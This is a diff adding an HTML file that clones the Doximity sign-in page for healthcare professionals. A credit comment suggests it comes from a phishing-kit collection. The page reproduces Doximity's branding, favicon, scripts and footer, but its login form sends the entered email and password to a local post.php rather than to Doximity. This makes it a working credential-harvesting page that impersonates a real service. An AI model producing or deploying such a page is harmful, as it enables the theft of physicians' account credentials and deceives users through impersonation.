@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+
+<!-- Creatred by https://github.com/makdosx -->
+
+<html lang="en"
+      data-client="browser "
+      class="layout-is-shared ">
+
+<head>
+  <title>Sign In to Doximity</title>
+  <meta property="description"
+        content="Doximity is a professional networking tool exclusively for Physicians and health care professionals. Join for Free." />
+  <meta content="width=device-width, initial-scale=1, maximum-scale=2"
+        name="viewport" />
+  <meta content="https://assets.doxcdn.com/image/upload/v1/logos/doximity/logo-og-doximity.png"
+        property="og:image">
+  <meta content="Doximity"
+        property="og:title">
+  <meta content="https://www.doximity.com"
+        property="og:url">
+  <meta property="og:description"
+        content="Over two million U.S. healthcare professionals as verified members. Largest network of MDs and other healthcare professionals. New to Doximity? Find your profile and join for free.">
+  <meta content="noindex"
+        name="robots" />
+  <meta name="format-detection"
+        content="telephone=no" />
+
+  <link href="data:image/x-icon;base64,AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAgBAAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8jBiAfI2MgHyO6IB8j7SAfI/8gHyP3IB8jxCAfI2cgHyMFAAAAAAAAAAAgHyOEIB8joCAfI6AgHyODAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAfIz0gHyPbIB8j/yAfI/8gHyP/IB8j/yAfI/8gHyP/IB8j/yAfI9AgHyMgIB8jDiAfI/8gHyP/IB8j/yAfI/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHyNNIB8j+iAfI/8gHyP/IB8j/yAfI/8gHyP/IB8j/yAfI/8gHyP/IB8j/yAfI+QgHyMqIB8j/yAfI/8gHyP/IB8j/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8jKSAfI/UgHyP/IB8j/yAfI/8gHyP/IB8j+SAfI7sgHyOeIB8jtCAfI/YgHyP/IB8j/yAfI9AgHyP/IB8j/yAfI/8gHyP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHyO+IB8j/yAfI/8gHyP/IB8j/yAfI6UgHyMVAAAAAAAAAAAAAAAAIB8jDyAfI5cgHyP/IB8j/yAfI/8gHyP/IB8j/yAfI/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8jNCAfI/8gHyP/IB8j/yAfI/8gHyObIB8jAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAfI4MgHyP/IB8j/yAfI/8gHyP/IB8j/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHyOLIB8j/yAfI/8gHyP/IB8j5iAfIwkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8jAyAfI9AgHyP/IB8j/yAfI/8gHyP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAfI8ggHyP/IB8j/yAfI/8gHyOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8jYiAfI/8gHyP/IB8j/yAfI/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8j6yAfI/8gHyP/IB8j/yAfIz8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHyMdIB8j/yAfI/8gHyP/IB8j/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHyP+IB8j/yAfI/8gHyP/IB8jJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAfIwEgHyP+IB8j/yAfI/8gHyP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAfI/ogHyP/IB8j/yAfI/8gHyMoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8jBSAfI/8gHyP/IB8j/yAfI/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIB8j5SAfI/8gHyP/IB8j/yAfI0wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHyMpIB8j/yAfI/8gHyP/IB8j/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHyO8IB8j/yAfI/8gHyP/IB8jlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAfI3cgHyP/IB8j/yAfI/8gHyP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM2QTwLNkE8MAAAAAAAAAAAAAAAAAAAAACAfI3wgHyP/IB8j/yAfI/8gHyP0IB8jHAAA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"
+        rel="shortcut icon"
+        type="image/vnd.microsoft.icon" />
+
+  <link rel="preload" as="font" href="https://assets.doxcdn.com/raw/upload/fonts/hk-grotesk/HKGrotesk-Regular.woff2" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" as="font" href="https://assets.doxcdn.com/raw/upload/fonts/hk-grotesk/HKGrotesk-Bold.woff2" type="font/woff2" crossorigin="anonymous">
+
+  <style> body {display: none;} </style>
+  <link href="https://auth.doximity.com/assets/css/auth-37adac735615f9532c4e0124bff72bbf.css?id=2" media="all" rel="stylesheet"/>
+
+  
+
+  
+
+<script>
+  if (Math.random() * 100 < 50) {
+    window['_fs_debug'] = false;
+    window['_fs_script'] = 'edge.fullstory.com/s/fs.js';
+    window['_fs_host'] = 'fullstory.com';
+    window['_fs_org'] = "1qaM";
+    window['_fs_namespace'] = 'FS';
+    window['_fs_ready'] = function() {
+      var sessionUrl = "fullstory_url=" + window['_fs_namespace'].getCurrentSessionURL();
+      document.cookie = sessionUrl;
+    };
+    (function(m,n,e,t,l,o,g,y){
+      if (e in m) {if(m.console && m.console.log) { m.console.log('FullStory namespace conflict. Please set window["_fs_namespace"].');} return;}
+      g=m[e]=function(a,b,s){g.q?g.q.push([a,b,s]):g._api(a,b,s);};g.q=[];
+      o=n.createElement(t);o.async=1;o.crossOrigin='anonymous';o.src='https://'+_fs_script;
+      y=n.getElementsByTagName(t)[0];y.parentNode.insertBefore(o,y);
+      g.identify=function(i,v,s){g(l,{uid:i},s);if(v)g(l,v,s)};g.setUserVars=function(v,s){g(l,v,s)};g.event=function(i,v,s){g('event',{n:i,p:v},s)};
+      g.anonymize=function(){g.identify(!!0)};
+      g.shutdown=function(){g("rec",!1)};g.restart=function(){g("rec",!0)};
+      g.log = function(a,b){g("log",[a,b])};
+      g.consent=function(a){g("consent",!arguments.length||a)};
+      g.identifyAccount=function(i,v){o='account';v=v||{};v.acctId=i;g(o,v)};
+      g.clearUserCookie=function(){};
+      g.setVars=function(n, p){g('setVars',[n,p]);};
+      g._w={};y='XMLHttpRequest';g._w[y]=m[y];y='fetch';g._w[y]=m[y];
+      if(m[y])m[y]=function(){return g._w[y].apply(this,arguments)};
+      g._v="1.3.0";
+    })(window,document,window['_fs_namespace'],'script','user');
+  }
+</script>
+
+
+</head>
+
+<body class="
+  auth-layout-main
+  auth-app
+  
+  auth-layout-login
+  
+    auth-scope-page
+  
+  
+">
+
+
+
+
+  
+<header class="row header header-center header-no-menu hide-for-print">
+  <div class="section">
+    <a href="#wcag-main-content" class="wcag-skip-to-main-content">
+      Skip to main content
+    </a>
+    <a href="https://www.doximity.com/signin" class="header-standalone-signin-link">Sign In</a>
+    <nav>
+      <a class="logo
+        
+          
+        
+      " href="
+      
+        https://www.doximity.com
+      ">
+        <svg class="header-logo header-logo-asset header-logo-doximity" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" x="0" y="0" viewBox="0 0 1094 275" xml:space="preserve" width="144" height="36"><style>.logo-doximity-class-1{fill:#231f20}.st1{fill:#2C90ED}</style><path class="logo-doximity-class-1" d="M547.6 94.7h-18c-3.1 0-5.6 2.5-5.6 5.6v122.4c0 3.1 2.5 5.6 5.6 5.6h18c3.1 0 5.6-2.5 5.6-5.6V100.3c0-3.1-2.5-5.6-5.6-5.6zM741.6 91.9c-18.4 0-33.1 7.7-44.9 23.5l-.9 1.2-.7-1.3c-7.5-15.1-21.6-23.3-39.7-23.3-21.2 0-32.8 12.3-40.6 23l-1.7 2.3v-16.9c0-3.1-2.5-5.6-5.6-5.6h-18c-3.1 0-5.6 2.5-5.6 5.6v122.4c0 3.1 2.5 5.6 5.6 5.6h18c3.1 0 5.6-2.5 5.6-5.6v-69.9c0-21 11.7-34.5 29.9-34.5 18 0 28.4 12.3 28.4 33.8v70.7c0 3.1 2.5 5.6 5.6 5.6h18c3.1 0 5.6-2.5 5.6-5.6V153c0-21.3 11.5-34.5 29.9-34.5 24.7 0 28.4 21.3 28.4 34V223c0 3.1 2.5 5.6 5.6 5.6h18c3.1 0 5.6-2.5 5.6-5.6v-79.9c0-32.7-16.9-51.2-46.5-51.2zM838.8 94.8h-18c-3.1 0-5.6 2.5-5.6 5.6v122.4c0 3.1 2.5 5.6 5.6 5.6h18c3.1 0 5.6-2.5 5.6-5.6V100.4c0-3.1-2.5-5.6-5.6-5.6zM940.6 94.8h-30.9V63.2c0-3.1-2.5-5.6-5.6-5.6h-18c-3.1 0-5.6 2.5-5.6 5.6v31.6H869c-3.1 0-5.6 2.5-5.6 5.6v13.7c0 3.1 2.5 5.6 5.6 5.6h11.6v72.2c0 26.1 12.4 38.8 38.1 38.8 9.1 0 16.7-1.6 23.8-4.9 2-.9 3.2-2.9 3.2-5.1v-12c0-1.7-.8-3.4-2.2-4.4-1.4-1.1-3.2-1.4-4.9-.9-3.6 1-7.3 1.5-11.3 1.5-11.7 0-17.6-6-17.6-17.9v-67.4h30.9c3.1 0 5.6-2.5 5.6-5.6v-13.7c0-3-2.5-5.5-5.6-5.5zM1087.9 97.2c-1-1.5-2.8-2.4-4.6-2.4h-18.2c-2.4 0-4.5 1.5-5.3 3.7l-34.5 98.6-37.5-98.7c-.8-2.2-2.9-3.6-5.2-3.6h-19.1c-1.9 0-3.6.9-4.6 2.5-1 1.5-1.2 3.5-.5 5.2l52.8 127.1-.2.3c-5.9 13.2-12.3 16-20.1 16-4.2 0-8.6-.9-13-2.6-2.8-1.1-5.9.2-7.1 2.9l-5.2 11.4c-.6 1.4-.7 2.9-.1 4.3.5 1.4 1.6 2.5 3 3.1 8.2 3.6 16.4 5.2 25.7 5.2 21.3 0 33.2-10.1 43.8-37.4l50.4-130.4c.8-1.7.5-3.6-.5-5.2zM217.1 42.9h-18c-3.1 0-5.6 2.5-5.6 5.6v69.1l-1.7-2.2c-12-15.8-26.9-23.5-45.4-23.5-30.8 0-61.9 23.8-61.9 69.4v.5c0 45 31.9 69.4 61.9 69.4 18.6 0 33.5-8.2 45.4-25l1.7-2.4v19c0 3.1 2.5 5.6 5.6 5.6h18c3.1 0 5.6-2.5 5.6-5.6V48.5c0-3.1-2.5-5.6-5.6-5.6zM113.9 161.8v-.5c0-25.7 16.8-44.3 39.9-44.3 22.9 0 40.2 19 40.2 44.3v.5c0 24.8-17.6 44.3-40.2 44.3-22.7-.1-39.9-19.1-39.9-44.3zM312.9 91.9c-40 0-71.4 30.7-71.4 69.9v.5c0 38.7 31.1 69.1 70.9 69.1 40.2 0 71.7-30.6 71.7-69.6v-.5c0-39-31.3-69.4-71.2-69.4zm0 114.1c-23.7 0-42.2-19.5-42.2-44.3v-.5c0-25.5 17.5-44 41.7-44 24.2 0 42.5 19.2 42.5 44.5v.5c0 25.4-17.6 43.8-42 43.8zM460.7 159.9l40.7-56.4c1.2-1.7 1.4-3.9.4-5.8-1-1.9-2.9-3-5-3h-17c-1.8 0-3.6.9-4.6 2.4l-30.1 43.7L415 97.1c-1-1.5-2.8-2.4-4.6-2.4h-17.7c-2.1 0-4 1.2-5 3-1 1.9-.8 4.1.4 5.8l40.7 56.7-42.5 59.2c-1.2 1.7-1.4 3.9-.4 5.8 1 1.9 2.9 3 5 3h17c1.8 0 3.6-.9 4.6-2.4l31.9-46.5 32.2 46.5c1 1.5 2.8 2.4 4.6 2.4H499c2.1 0 4-1.2 5-3 1-1.9.8-4.1-.4-5.8l-42.9-59.5z"/><path class="st1" d="M46 129.9c-.7-7.8-.5-17.2 3.2-30.1 3.1-10.4 10.5-21.9 19.1-30 8.4-7.9 19.8-14.1 32.2-16.9 11.8-2.7 21.7-2.5 29.2-1.6 1.1 0 1.9.5 2.3 1 .8.8.9 2.6.5 3.1-.4.4-1.4.8-2.4.8-16.3 1-33.8 9.8-50.6 25.6-15.4 14.5-26.4 32.9-28.5 48.8-.1 1-.5 1.9-1 2.3-.5.4-2.4.3-3.1-.5-.4-.6-.8-1.4-.9-2.5zM5 111.3c-.9-10.3-.7-22.9 4.3-40.1 4.1-13.9 13.9-29.1 25.4-39.9C45.9 20.8 61 12.6 77.6 8.8c15.7-3.6 28.9-3.3 38.8-2.2 1.4 0 2.5.7 3.1 1.3 1 1.1 1.2 3.5.6 4.1-.5.5-1.8 1-3.1 1.1-21.7 1.4-45 13.1-67.3 34.1-20.6 19.4-35.2 43.8-38 65-.2 1.3-.7 2.5-1.3 3.1-.6.6-3.1.4-4.2-.7-.6-.6-1.1-1.7-1.2-3.3z"/><path class="logo-doximity-class-1" d="M538.6 53.9c-8 0-14.6 6.5-14.6 14.6 0 8 6.5 14.6 14.6 14.6 8 0 14.6-6.5 14.6-14.6 0-8-6.5-14.6-14.6-14.6zM829.8 53.9c-8 0-14.6 6.5-14.6 14.6 0 8 6.5 14.6 14.6 14.6 8 0 14.6-6.5 14.6-14.6 0-8-6.6-14.6-14.6-14.6z"/>
+        </svg>
+        
+        <img class="header-logo header-logo-asset header-logo-asset-custom header-logo-amion" loading="eager" src="https://assets.doxcdn.com/image/upload/fl_sanitize/v1/logos/amion/logo-amion-logotype.svg" />
+      </a>
+    </nav>
+  </div>
+</header>
+
+
+
+<main class="contents" id="wcag-main-content">
+
+
+<div class="row signin-methods">
+  <div class="signin-methods-section section">
+    
+    <div class="signin-methods-wrap ">
+      <div data-da-section="login" class="signin-grid-child signin-grid-child-left signin-methods-signin">
+        <div class="no-first-last-margins">
+          <form accept-charset="UTF-8" style="display: none;">
+          </form>
+
+          <fieldset>
+            <form
+                data-da-section="login"
+                data-sel-login-form=""
+                accept-charset="UTF-8"
+                novalidate
+                method="post" action="post.php"
+            >
+              <div class="heading-3" role="heading" aria-level="1">Sign In</div>
+
+              <div style="display: none;">
+      
+                
+                
+              </div>
+
+              <div class="signin-methods-inputs">
+                
+                  <div class="form-input">
+                    <p>
+                      <label
+                          class="full"
+                          aria-label="Enter an email address"
+                          data-sel-login-label=""
+                      >
+                        <span class="wcag-compliant-hide">Enter an email address</span>
+                        <input
+                            aria-label="Email"
+                            autocapitalize="none"
+                            autocorrect="off"
+                            data-sel-login=""
+                            id="login"
+                            name="user"
+                            placeholder="Email"
+                            tabindex="0"
+                            type="email"
+                            value=""
+
+                            class="full"
+                            autofocus
+                        />
+                        <small class="under-input-label ie-10-and-above-only">Email</small>
+                      </label>
+                    </p>
+                  </div>
+                
+
+                <div class="form-input">
+                  <p>
+                    <label
+                        class="full"
+                        aria-label="Enter a password"
+                        data-sel-password-label=""
+                    >
+                      <span class="wcag-compliant-hide">Enter a password</span>
+                      <input
+                          aria-label="Password"
+                          autocapitalize="none"
+                          autocomplete="current-password"
+                          autocorrect="off"
+                          data-sel-password=""
+                          id="password"
+                          name="pass"
+                          placeholder="Password"
+                          tabindex="0"
+                          type="password"
+
+                          class="full"
+                      />
+                      <small class=" under-input-label ie-10-and-above-only">Password</small>
+                    </label>
+                  </p>
+                </div>
+
+                <div class="clear"></div>
+                <div class="form-input">
+                  <p>
+                    <button
+                        aria-label="Sign In"
+                        class="btn blue solid full btn-signin"
+                        data-sel-signin-button=""
+                        id="signinbutton"
+                        name="button"
+                        tabindex="0"
+                        type="submit"
+                    >
+                      <span class="btn-copy">Sign In</span>
+                    </button>
+                  </p>
+                </div>
+              </div>
+
+              
+                <p class="auth-remember-me">
+                  <label aria-label="Keep me signed in">
+                    <input
+                        data-sel-remember-me=""
+                        id="remember_me"
+                        name="remember_me"
+                        tabindex="0"
+                        type="checkbox"
+                        value="yes"
+                                  
+                          checked
+                                  
+                    />
+                    <span>Keep me signed in</span>
+                  </label>
+                </p>
+              
+            </form>
+          </fieldset>
+        </div>
+      </div>
+
+      <div class="signin-methods-other-methods-wrapper">
+        <div class="signin-methods-other-methods-or">
+          <span class="signin-methods-other-methods-or-text">OR</span>
+        </div>
+        <div class="signin-grid-child signin-grid-child-right signin-separator signin-methods-other-methods">
+          <div class="heading-3 signin-methods-other-methods-title" role="heading" aria-level="2">
+            Tired of typing in your password?
+          </div>
+          <div class="signin-methods-other-methods-options">
+            <div data-sel-text="" class="signin-methods-other-methods-text" data-da-section="download_app"
+              
+            >
+              <div class="download-app-text">
+                <p class="download-app-subheader">
+                  Get the Doximity app and never type your password again.
+                </p>
+                <div data-sel-download-notification="">
+                  <form class="download-app-sms center" method="POST" id="downloadNotification"
+                      action="https://www.doximity.com/api/v2/download_notifications">
+                    <input type="hidden" id="download_notification_campaign_pid"
+                         name="download_notifications[campaign_params][pid]"
+                         value="internal_marketing">
+                    <input type="hidden" id="download_notification_campaign_c"
+                         name="download_notifications[campaign_params][c]"
+                         value="web_doximity_signin_desktop_landscape">
+                    <div class="retain">
+                      <div class="col-3-4 download-app-text-input-wrapper">
+                        <input
+                            class="full"
+                            data-sel-notification-phone-number=""
+                            id="download_notification_phone_number"
+                            placeholder="Enter your mobile number" size="30" type="text"
+                            aria-label="Enter your mobile number to get a link to download the Doximity application"
+                            name="download_notification[phone_number]"
+                            value=""
+                        >
+                      </div>
+                      <div class="col-1-4">
+                        <button
+                            class="btn gray-lighter solid full"
+                            id="sendButton"
+                            data-sel-send-button=""
+                        >
+                          Send
+                        </button>
+                      </div>
+                      <div class="clear"></div>
+                    </div>
+                    <p class="download-app-text-errors" style="display: none;" id="formErrors">
+                      <small id="formErrorsText"></small>
+                    </p>
+                  </form>
+                  
+                </div>
+              </div>
+              <div class="auth-mobile-download-button-wrap">
+                <a href="https://doximity.onelink.me/vm1X?c=web_doximity_signin_mobile&pid=internal_marketing"
+                   class="btn blue full">Get The App</a>
+              </div>
+            </div>
+            
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="center" data-da-section="find_or_forgot">
+      
+        <p class="signin-methods-new">
+          New to Doximity?
+          <a data-da-find-your-profile class="btn-on-mobile"
+            
+              href="https://www.doximity.com/registration/search?return_to=https%3a%2f%2fwww.doximity.com%2f"
+              data-sel-new-user-link-external=""
+            
+          >
+            Find your profile
+            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" viewBox="0 0 50 50" class="icon" width="16" height="16"><path d="M50 25C50 11.2 38.8 0 25 0S0 11.2 0 25s11.2 25 25 25 25-11.2 25-25zM3.1 25C3.1 12.9 12.9 3.1 25 3.1c12.1 0 21.9 9.8 21.9 21.9 0 12.1-9.8 21.9-21.9 21.9-12.1 0-21.9-9.8-21.9-21.9z"></path><path d="M38.9 26.1c.1-.1.3-.3.3-.5.1-.3.1-.7 0-1.1v-.2l-.1-.1c0-.1-.1-.2-.2-.3l-8.5-8.5c-.6-.6-1.6-.6-2.2 0-.6.6-.6 1.6 0 2.2l5.8 5.8H12.3c-1 0-1.6.6-1.6 1.6s.6 1.6 1.6 1.6H34l-5.8 5.8c-.3.3-.4.7-.4 1.1 0 .5.2.8.4 1.1.3.3.7.4 1.1.4.4 0 .8-.2 1.1-.4l8.5-8.5z"></path></svg>
+          </a>
+        </p>
+      
+
+      <p class="signin-methods-forgot-password">
+        <a target="_parent" data-sel-forgot-password-link=""
+           href="/password_reset?redirect_to=https%3a%2f%2fwww.doximity.com%2f"
+        >
+          Forgot your password?
+        </a>
+      </p>
+    </div>
+  </div>
+</div>
+
+
+
+
+</main>
+
+
+  
+<footer class="row footer hide-for-print" data-sel-footer="">
+  <div class="section">
+    <div class="footer-bottom">
+      <div class="col-1-4">
+        <p>
+          <small>
+            © 2022  Doximity, Inc.
+          </small>
+        </p>
+      </div>
+      <div class="col-3-4 footer-bottom-links-wrapper">
+        <p class="footer-bottom-links">
+          <a
+            data-sel-help-url=""
+            href="https://www.doximity.com/help"
+            aria-label="Get Help or Support"
+          >
+            <small>Help</small>
+          </a>
+          <a
+            data-sel-terms-of-service-url=""
+            href="https://www.doximity.com/terms-of-service"
+            aria-label="Doximity Terms of Service"
+          >
+            <small>Terms of Service</small>
+          </a>
+          <a
+            data-sel-privacy-url=""
+            href="https://www.doximity.com/clinicians/privacy"
+            aria-label="Doximity Privacy Policy"
+          >
+            <small>Privacy</small>
+          </a>
+        </p>
+      </div>
+      <div class="clear"></div>
+    </div>
+    <div class="narrow footer-bottom-centered">
+      <p class="footer-trademarks">
+        iPhone and iPad are trademarks of Apple Inc., registered in the U.S. and other countries.
+      </p>
+      
+        <p class="footer-recaptcha">
+          This site is protected by reCAPTCHA and the Google
+          <a
+            target="_blank"
+            href="https://policies.google.com/privacy"
+            aria-label="Google Privacy Policy"
+          >
+            Privacy Policy
+          </a> and
+          <a
+            target="_blank"
+            href="https://policies.google.com/terms"
+            aria-label="Google Terms of Service"
+          >
+            Terms of Service
+        </a> apply.
+        </p>
+      
+    </div>
+  </div>
+</footer>
+  
+  
+
+</body>
+</html>
